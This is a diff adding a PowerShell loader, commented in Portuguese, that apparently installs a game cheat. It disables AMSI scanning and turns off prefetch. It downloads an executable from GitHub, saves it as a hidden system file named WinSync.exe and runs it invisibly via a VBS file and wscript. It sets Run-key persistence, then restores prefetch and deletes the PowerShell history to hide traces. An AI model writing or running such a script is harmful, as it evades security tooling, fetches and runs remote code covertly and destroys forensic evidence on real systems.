@@ -1,1 +1,23 @@
+# 1. Bypass AMSI
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
+
+# 2. Baixa o cheat
+$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
+$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $path)
+Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+
+# 3. Roda escondido via wscript
+$vbsPath = "$env:TEMP\sys_update.vbs"
+"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
+
+# 4. Persistência no Registro
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value "wscript.exe `"$vbsPath`""
+
+# 5. Limpeza
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
